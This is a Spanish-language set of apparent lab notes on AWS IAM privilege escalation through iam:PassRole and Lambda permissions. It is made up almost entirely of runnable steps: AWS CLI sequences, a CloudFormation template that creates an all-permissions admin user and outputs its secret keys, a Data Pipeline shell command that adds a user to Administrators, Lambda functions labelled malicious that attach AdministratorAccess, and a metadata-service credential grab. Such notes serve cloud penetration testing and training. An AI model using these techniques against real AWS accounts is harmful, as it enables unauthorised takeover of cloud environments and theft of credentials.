# Si el usuario tiene el permiso IAM:PassRole* se pueden presentar los siguientes escenarios.  
## CreateEC2WithExistingIP  
### Permisos Requeridos: iam:PassRole y ec2:RunInstances  

aws iam list-attached-user-policies --user-name privesc3-CreateEC2WithExistingInstanceProfile-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc3-CreateEC2WithExistingInstanceProfile --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::583318501385:role/privesc3-CreateEC2WithExistingInstanceProfile-role --role-session-name privesc3  
aws ec2 run-instances --image-id ami-0022f774911c1d690 --instance-type t2.micro --iam-instance-profile Arn=arn:aws:iam::583318501385:instance-profile/perfil.ec2 --key-name "Nombre-llave.ssh" --security-group-ids sg-0230440b7ca1565ce --region us-east-1 --profile privesc3  
aws ec2 describe-instances --instance-id i-0dc0d8712f11c25ca --region us-east-1 --profile privesc3  
ssh ec2-user@35.175.174.111 -i Nombre-llave.pem  
Dentro de la instancia: aws sts get-caller-identity  
Dentro de la instancia: aws iam add-user-to-group --group-name Group-Root-Prueba --user-name privesc3-CreateEC2WithExistingInstanceProfile-user  
		
## PassExistingRoleToNewGlueDevEndpoint  
### Permisos Requeridos: iam:PassRole y glue:CreateDevEndpoint  

aws iam list-attached-user-policies --user-name privesc18-PassExistingRoleToNewGlueDevEndpoint-user  
aws iam get-policy-version --policy-arn arn:aws:iam::037572360634:policy/privesc18-PassExistingRoleToNewGlueDevEndpoint --version-id v1  
Creamos unas llaves ssh  
ssh-keygen  

aws sts assume-role --role-arn arn:aws:iam::037572360634:role/privesc18-PassExistingRoleToNewGlueDevEndpoint-role --role-session-name privesc18  
aws sts get-caller-identity --profile privesc18  
aws glue create-dev-endpoint --endpoint-name privesctest --role-arn arn:aws:iam::037572360634:role/privesc-high-priv-service-role --public-key file:///home/hacker/.ssh/id_rsa.pub --profile privesc18  
aws glue get-dev-endpoint --endpoint-name privesctest --profile privesc18  
ssh glue@ec2-18-119-9-156.us-east-2.compute.amazonaws.com -i /home/hacker/.ssh/id_rsa  

Dentro de la instancia  
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy  
aws sts get-caller-identity  
		
## PassExistingRoleToCloudFormation  
### Permisos Requeridos: iam:PassRoley cloudformation:CreateStack  

aws iam list-attached-user-policies --user-name privesc20-PassExistingRoleToCloudFormation-user  
aws iam get-policy-version --policy-arn arn:aws:iam::037572360634:policy/privesc20-PassExistingRoleToCloudFormation --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::037572360634:role/privesc20-PassExistingRoleToCloudFormation-role --role-session-name privesc20  
aws configure --profile privesc20  
aws sts get-caller-identity --profile privesc20  
Creamos el archivo IAMCreateUserPlantilla.json  

```json
{
  "Resources": {
    "AdminUser": {
      "Type": "AWS::IAM::User"
    },
    "AdminPolicy": {
      "Type": "AWS::IAM::ManagedPolicy",
      "Properties": {
        "Description" : "This policy allows all actions on all resources.",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "*"
              ],
              "Resource": "*"
            }
          ]
        },
        "Users": [{
          "Ref": "AdminUser"
        }]
      }
    },
    "MyUserKeys": {
      "Type": "AWS::IAM::AccessKey",
      "Properties": {
        "UserName": {
          "Ref": "AdminUser"
        }
      }
    }
  },
  "Outputs": {
    "AccessKey": {
      "Value": {
        "Ref": "MyUserKeys"
      },
      "Description": "Access Key ID of Admin User"
    },
    "SecretKey": {
      "Value": {
        "Fn::GetAtt": [
          "MyUserKeys",
          "SecretAccessKey"
        ]
      },
      "Description": "Secret Key of Admin User"
    }
  }
}

```

aws cloudformation create-stack --stack-name privesc --template-url https://Prueba-cpna.s3.amazonaws.com/IAMCreateUserPlantilla.json --role arn:aws:iam::037572360634:role/privesc-high-priv-service-role --capabilities CAPABILITY_IAM --profile privesc20  
aws cloudformation describe-stacks --stack-name arn:aws:cloudformation:us-east-1:037572360634:stack/privesc/42a69900-e77f-11ec-bb6b-0e95d0bbdd5b --profile privesc20  
		
## PassExistingRoleToNewDataPipeline  
### Permisos Requqeridos: iam:PassRole, datapipeline:CreatePipeline y datapipeline:PutPipelineDefinition  

aws iam list-attached-user-policies --user-name privesc21-PassExistingRoleToNewDataPipeline-user  
aws iam get-policy-version --policy-arn arn:aws:iam::037572360634:policy/privesc21-PassExistingRoleToNewDataPipeline --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::037572360634:role/privesc21-PassExistingRoleToNewDataPipeline-role --role-session-name privesc21  
aws configure --profile privesc21  
aws sts get-caller-identity --profile privesc21  
aws datapipeline create-pipeline --name privesc --unique-id privesctest --profile privesc21  

Creamos el archivo pipeline-test.json  

```json
{
     "objects": [
     {
         "id" : "CreateDirectory",
         "type" : "ShellCommandActivity",
         "command" : "aws iam add-user-to-group --group-name Administrators --user-name privesc21-PassExistingRoleToNewDataPipeline-user",
         "runsOn" : {"ref": "instance"}
     },
     {
         "id": "Default",
         "scheduleType": "ondemand",
         "failureAndRerunMode": "CASCADE",
         "name": "Default",
         "role": "privesc-high-priv-service-role",
         "resourceRole": "privesc-high-priv-service-profile"
     },
     {
         "id" : "instance",
         "name" : "instance",
         "type" : "Ec2Resource",
         "actionOnTaskFailure" : "terminate",
         "actionOnResourceFailure" : "retryAll",
         "maximumRetries" : "1",
         "instanceType" : "t2.micro",
         "securityGroups" : ["launch-wizard-1"],
         "keyPair" : "ssh_keys",
         "role" : "privesc-high-priv-service-role",
         "resourceRole" : "privesc-high-priv-service-profile"
     }]
}

```

aws datapipeline put-pipeline-definition --pipeline-id df-07792257LS8Z17HL0Z5 --pipeline-definition file://pipeline-test.json --profile privesc21  
aws datapipeline activate-pipeline --pipeline-id df-07792257LS8Z17HL0Z5 --profile privesc21  
		
## PassExistingRoleToNewLambdaThenInvoke
### Permisos Requeridos: iam:PassRole, lambda:CreateFunction y lambda:InvokeFunction  

aws iam list-attached-user-policies --user-name privesc15-PassExistingRoleToNewLambdaThenInvoke-user  
aws iam get-policy-version --policy-arn arn:aws:iam::579852752421:policy/privesc15-PassExistingRoleToNewLambdaThenInvoke --version-id v1  

Crear un role: AWS Service y Caso de uso lambda, Policy AdministratorAccess  
aws iam create-access-key --user-name privesc15-PassExistingRoleToNewLambdaThenInvoke-user  
aws configure --profile privesc15  

Crear una función maliciosa con el siguiente contenido:  
cat maliciuos_Function.py  

```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName='privesc15-PassExistingRoleToNewLambdaThenInvoke-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
  
```
	
comprimir este script a un archivo comprimido llamado function.zip  
aws lambda create-function --function-name privesc1 --runtime python3.9 --role arn:aws:iam::579852752421:role/Fortress-Lambda --handler maliciuos_Function.lambda_handler --zip-file fileb://function.zip --region us-east-2 --profile privesc15  
aws lambda invoke --function-name privesc1 output.txt --region us-east-2 --profile privesc15  
cat output.txt  
aws configure --profile privesc15  
		
## PassRoleToNewLambdaThenTriggerWithNewDynamo  
### Permisos Requeridos: iam:PassRole, lambda:CreateFunction, lambda:CreateEventSourceMapping, dynamodb:PutItem, dynamodb:CreateTable  

aws iam list-attached-user-policies --user-name privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo-user  
aws iam get-policy-version --policy-arn arn:aws:iam::579852752421:policy/privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo --version-id v1  

Crear un role: AWS Service y Caso de uso lambda, Policy AdministratorAccess  
aws iam create-access-key --user-name privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo-user  
aws sts get-caller-identity --profile privesc16  

cat privesc16.py  

```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName='privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response

```
	
comprimir este script a un archivo comprimido llamado function.zip  
aws lambda create-function --function-name privesc2 --runtime python3.9 --role arn:aws:iam::579852752421:role/Fortress-Lambda --handler privesc16.lambda_handler --zip-file fileb://function.zip --region us-east-2 --profile privesc16  
aws lambda create-event-source-mapping --function-name privesc2 --event-source-arn arn:aws:dynamodb:us-east-2:579852752421:table/Tabla_Vulnerable/stream/2024-07-24T20:23:43.053 --enabled --starting-position LATEST --region us-east-2 --profile privesc16  

Crear un archivo con el siguiente contenido:  
cat datos-tabla.json

```json
{
  ""ID"": {
    ""S"": ""cpad-001""
  }
}

```

aws dynamodb put-item --table-name Tabla_Vulnerable --item file://datos-tabla.json --region us-east-2  
aws dynamodb scan --table-name Tabla_Vulnerable --region us-east-2  
aws iam list-attached-user-policies --user-name privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo-user  
		
## EditExistingLambdaFunctionWithRole  
### Permisos Requeridos: lambda:UpdateFunctionCode  

aws iam list-attached-user-policies --user-name privesc17-EditExistingLambdaFunctionWithRole-user  
ARN obtenido  
	arn:aws:iam::579852752421:policy/privesc17-EditExistingLambdaFunctionWithRole  

En una lambda ya creada o creando una nueva con los valores por defecto  
aws iam create-access-key --user-name privesc17-EditExistingLambdaFunctionWithRole-user  
aws sts get-caller-identity --profile privesc17  
aws lambda get-function --function-name HolaMundo --region us-east-2  

Crear una funcion maliciosa con el siguiente contenido:  
cat privesc17.py  

```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName='privesc17-EditExistingLambdaFunctionWithRole-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response

```

comprimir este script a un archivo comprimido llamado function.zip  
aws lambda update-function-code --function-name HolaMundo --region us-east-2 --zip-file fileb://function.zip --profile privesc17  
aws lambda invoke --function-name HolaMundo output.txt --region us-east-2  

